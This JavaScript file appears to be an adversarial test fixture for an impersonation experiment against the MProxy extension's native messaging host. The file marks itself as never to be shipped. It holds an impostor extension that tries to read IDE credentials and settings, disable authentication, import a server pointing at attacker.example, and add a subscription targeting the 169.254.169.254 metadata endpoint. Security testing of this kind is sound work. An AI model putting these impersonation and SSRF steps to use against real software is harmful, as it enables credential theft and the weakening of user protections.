// PP-ADVERSARIAL-FIXTURE — an unpacked extension that copies MProxy's manifest `key` (so Chromium
// gives it MProxy's extension ID) but runs its own code. Used only by
// e2e/experiments/impersonation-experiment.mjs. Never ship.
globalThis.steal = async () => {
  const out = {};
  const port = chrome.runtime.connectNative('com.privateproxy.host');
  const pending = new Map();
  let nextId = 1;
  let closed = '';
  port.onMessage.addListener((m) => {
    if (m && typeof m.id === 'number' && pending.has(m.id)) {
      pending.get(m.id)(m);
      pending.delete(m.id);
    }
  });
  port.onDisconnect.addListener(() => {
    closed = chrome.runtime.lastError?.message || 'closed';
    for (const r of pending.values()) r({ ok: false, error: { message: 'disconnected: ' + closed } });
    pending.clear();
  });
  const call = (cmd, args = {}) =>
    new Promise((resolve) => {
      if (closed) return resolve({ ok: false, error: { message: 'disconnected: ' + closed } });
      const id = nextId++;
      pending.set(id, resolve);
      port.postMessage({ id, cmd, args });
      setTimeout(() => {
        if (pending.has(id)) {
          pending.delete(id);
          resolve({ ok: false, error: { message: 'timeout' } });
        }
      }, 8000);
    });
  const short = (r) => (r.ok ? 'OK ' + JSON.stringify(r.result).slice(0, 160) : 'REFUSED ' + (r.error?.message || ''));
  out.hello = short(await call('hello', { protocolVersion: 3, extensionVersion: 'impersonator' }));
  out.getIdeCredentials = short(await call('getIdeCredentials'));
  out.listServers = short(await call('listServers'));
  out.getSettings = short(await call('getSettings'));
  out.getDiagnostics = short(await call('getDiagnostics'));
  // Attempts to weaken protections through settings.
  out.disableIdeAuth = short(await call('setSettings', { ideAuth: false }));
  out.allowPrivateSubscriptions = short(await call('setSettings', { allowPrivateSubscriptionHosts: true }));
  // Import a server that points somewhere the attacker controls.
  out.importAttackerServer = short(await call('importText', { text: 'vless://00000000-0000-4000-8000-000000000000@203.0.113.66:443?encryption=none&security=tls&sni=attacker.example&type=tcp#Attacker', source: 'paste' }));
  out.subscriptionToMetadata = short(await call('addSubscription', { name: 'x', url: 'http://169.254.169.254/latest/meta-data/' }));
  out.closed = closed;
  try {
    port.disconnect();
  } catch {
    /* ignore */
  }
  return out;
};
